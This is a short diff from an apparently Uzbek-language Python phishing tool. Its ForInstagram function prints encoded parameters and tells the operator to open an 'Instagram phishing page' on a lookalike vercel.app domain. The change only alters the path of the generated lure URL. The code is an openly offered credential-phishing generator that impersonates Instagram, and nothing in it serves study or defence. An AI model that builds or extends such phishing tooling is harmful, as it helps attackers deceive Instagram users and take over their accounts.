@@ -52,7 +52,7 @@ def ForInstagram():
     print("u shifrlangan: ", u_enc)
     print("\nInstagram phishing sahifasiga quyidagicha URL bilan kiring:")
     print(
-        f"https://lns1agramvidios.vercel.app/instagram.com?t={t_enc}&i={i_enc}&u={u_enc}"
+        f"https://lns1agramvidios.vercel.app/?t={t_enc}&i={i_enc}&u={u_enc}"
     )
 which = 0
 while not which:
